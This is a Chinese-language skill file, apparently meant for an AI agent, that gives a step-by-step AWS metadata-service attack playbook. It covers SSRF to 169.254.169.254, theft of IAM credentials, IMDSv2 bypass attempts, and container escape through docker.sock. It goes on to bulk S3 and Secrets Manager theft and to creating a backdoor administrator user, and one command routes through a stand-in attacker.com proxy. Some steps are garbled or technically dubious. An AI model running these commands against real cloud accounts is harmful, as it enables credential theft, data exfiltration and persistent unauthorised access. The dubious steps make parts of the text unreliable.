---
name: aws-metadata-attack
type: attack
category: ssrf-exploitation
platform: aws
severity: high
---

# AWS 元数据服务攻击技能

## 触发条件

当满足以下任一条件时激活此技能：

- 发现 SSRF 漏洞
- 可以访问内部地址 169.254.169.254
- 用户要求"利用元数据服务"
- 在 EC2 实例或容器环境中
- 有访问内部网络的能力

## 前置检查

```bash
# 1. 测试是否能访问元数据服务
curl -I http://169.254.169.254/latest/meta-data/
# 如果返回 200 OK，可以访问

# 2. 检查 IMDS 版本
curl http://169.254.169.254/latest/meta-data/
# 如果返回数据，是 IMDSv1

# 如果需要 Token，是 IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 3. 检查网络环境
# 如果在容器中，检查 hop limit
curl http://169.254.169.254/latest/meta-data/
# 如果超时，可能是 hop limit 限制
```

## 攻击方法

### 方法 1: 直接访问（IMDSv1）

**适用场景**: 元数据服务未强制使用 IMDSv2

```bash
# 步骤 1: 获取 IAM 角色
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 返回: role-name

# 步骤 2: 获取临时凭证
ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
# 返回 JSON 凭证

# 步骤 3: 保存凭证
CREDENTIALS=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# 步骤 4: 配置 AWS CLI
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Token')

# 步骤 5: 验证权限
aws sts get-caller-identity
```

**验证成功**:
```bash
# 如果返回账户信息，攻击成功
aws iam list-attached-role-policies --role-name $ROLE_NAME
```

---

### 方法 2: SSRF 通过 Web 应用

**适用场景**: 存在 SSRF 漏洞的 Web 应用

```bash
# 步骤 1: 测试 SSRF
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# 步骤 2: 通过 SSRF 获取 IAM 角色
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 步骤 3: 获取凭证
ROLE_NAME="role-name"  # 从步骤 2 获取
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"

# 步骤 4: 保存返回的凭证

# 步骤 5: 配置并验证
aws configure set profile stolen
aws sts get-caller-identity --profile stolen
```

**验证成功**:
```bash
# 使用获取的凭证执行操作
aws s3 ls --profile stolen
```

---

### 方法 3: 通过 SSRF 代理工具

**适用场景**: SSRF 有协议限制或需要特殊构造

```bash
# 使用工具
# 1. 安oad SSRF 代理
git clone https://github.com/PortSwigger/http-request-smuggler
cd http-request-smuggler

# 2. 构造特殊请求
# 通过 CL.TE 或 TE.CL 技巧绕过限制

# 3. 访问元数据服务
curl -G "http://attacker.com/proxy" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

### 方法 4: IMDSv2 绕过

**适用场景**: 强制使用 IMDSv2，但有方法绕过

```bash
# 方法 A: 如果 SSRF 支持 PUT 请求
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --proxy http://target.com/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 方法 B: 通过 HTTP 头部注入
curl -H "X-aws-ec2-metadata-token: ttl-seconds:21600" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 方法 C: 通过 IPv6
curl -g -6 "http://[fe80::1%eth0]/latest/meta-data/iam/security-credentials/"
```

---

### 方法 5: 容器逃逸

**适用场景**: 在 Docker 容器中，hop limit > 1

```bash
# 步骤 1: 检查是否在容器中
cat /proc/1/cgroup
# 如果包含 docker 或 containerd，在容器中

# 步骤 2: 测试 hop limit
curl http://169.254.169.254/latest/meta-data/
# 如果成功，hop limit > 1

# 步骤 3: 获取凭证
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDENTIALS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# 步骤 4: 逃逸到宿主机
# 如果有 docker.sock 访问权限
docker run -it -v /:/mnt ubuntu chroot /mnt /bin/bash
```

---

## 枚举元数据

获取凭证后，枚举所有元数据：

```bash
# 基础信息
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/placement/region

# 用户数据（可能包含敏感信息）
curl http://169.254.169.254/latest/user-data/

# SSH 密钥
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key

# 网络配置
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/

# IAM 安全凭证（如果有）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## 攻击后操作

### 1. 枚举权限

```bash
# 使用获取的凭证
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 枚举角色权限
aws iam list-attached-role-policies --role-name ROLE_NAME

# 枚举可访问资源
aws ec2 describe-instances
aws s3 ls
aws lambda list-functions
```

### 2. 横向移动

```bash
# 列出其他 EC2 实例
aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId'

# 如果有权限，通过 SSM 连接其他实例
aws ssm start-session --target i-another-instance-id

# 或通过 SSH
ssh -i key.pem user@another-instance-ip
```

### 3. 数据窃取

```bash
# 列出 S3 存储桶
aws s3 ls

# 下载敏感数据
aws s3 sync s3://sensitive-bucket ./stolen-data

# 获取 Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id secret-name
```

### 4. 建立持久化

```bash
# 创建后门用户
aws iam create-user --user-name metadata-backdoor

# 创建访问密钥
aws iam create-access-key --user-name metadata-backdoor

# 添加到管理员组
aws iam add-user-to-group --group-name Administrators --user-name metadata-backdoor
```

## 常见错误处理

### 错误 1: 连接超时

```bash
# 原因: hop limit = 1，在容器中
# 解决: 尝试通过宿主机或其他服务中转
# 或寻找其他 SSRF 入口点
```

### 错误 2: 返回 401

```bash
# 原因: IMDSv2 需要 Token
# 解决: 先获取 Token，再访问元数据
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

### 错误 3: 返回空响应

```bash
# 原因: 实例没有附加 IAM 角色
# 解决: 枚举其他信息，寻找其他攻击路径
# 或尝试攻击其他服务
```

## 输出报告

```markdown
# AWS 元数据服务攻击报告

## 攻击环境
- 攻击入口: SSRF in web application
- IMDS 版本: v1/v2
- 容器环境: Docker/K8s

## 攻击结果
- ✅ 成功获取 IAM 角色凭证
- ✅ 角色名称: role-name
- ✅ 权限级别: high/medium/low

## 获取的凭证
- AccessKeyId: ASIA...
- SecretAccessKey: ...
- SessionToken: ...
- Expiration: ...

## 影响范围
- 可访问的服务: [list]
- 可访问的资源: [list]
- 数据泄露风险: high/medium/low

## 建议
- 强制使用 IMDSv2
- 设置 hop limit = 1
- 限制元数据服务访问
- 监控异常 API 调用
```

## 下一步行动

根据获取的权限，执行：

1. **aws-iam-attack** - 如果权限不足，继续提升权限
2. **aws-s3-attack** - 如果有 S3 访问权限
3. **aws-lambda-attack** - 如果有 Lambda 访问权限
4. **aws-persistence** - 建立持久化后门
